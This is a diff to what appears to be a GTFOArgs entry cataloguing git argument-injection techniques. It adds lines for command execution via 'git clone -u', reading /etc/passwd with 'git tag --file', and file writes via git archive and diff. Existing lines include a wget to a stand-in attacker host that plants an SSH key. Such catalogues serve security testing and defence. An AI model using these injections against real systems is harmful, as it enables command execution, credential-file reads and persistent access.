@@ -11,6 +11,9 @@ functions:
         git ls-remote --upload-pack='uname -a > /tmp/file #' main
         git fetch origin --upload-pack='cat /etc/passwd >&2 ;'
         git pull origin --upload-pack='wget attacker.com/key -O /root/.ssh/authorized-keys #'
+    - description: The `--upload-pack` / `-u` flag on `git clone` can execute commands. A colon in the positional argument helps trigger execution.
+      code: |
+        git clone '-u$({touch,/tmp/foo})' ':x'
     - description: This method takes advantage of one of the file-write methods to overwrite `.git/config`. Officially, this is probably out of scope of GTFOArgs, but it is included anyways. `id` is executed and written to `/tmp/fsmonitor` in this example.
       code: |
         git commit --allow-empty -m 'fsmonitor = "id>/tmp/fsmonitor"'
@@ -24,6 +27,10 @@ functions:
     - description: If you are reading a file outside of the git directory, you can use `git diff` against `/dev/null`.
       code: |
         git diff /dev/null /etc/passwd
+    - description: The `--file` flag on `git tag` reads a file's contents into the tag message. Retrieve it with `git cat-file`.
+      code: |
+        git tag '--file=/etc/passwd' main
+        git cat-file -p refs/tags/main
   file-write:
     - description: Outputs the most recent changelog to an arbitrary file. Note that this also contains the commit information.
       code: |
@@ -34,4 +41,10 @@ functions:
     - description: Can be used to overwrite a file, or create an empty file.
       code: |
         git blame --output=/tmp/file_to_truncate.txt
+    - description: Archives the repository to an arbitrary output file.
+      code: |
+        git archive '--output=/tmp/foo'
+    - description: The undocumented `--output` flag on `git diff` can truncate or create files.
+      code: |
+        git diff '--output=/tmp/file_to_truncate.txt'
 ---
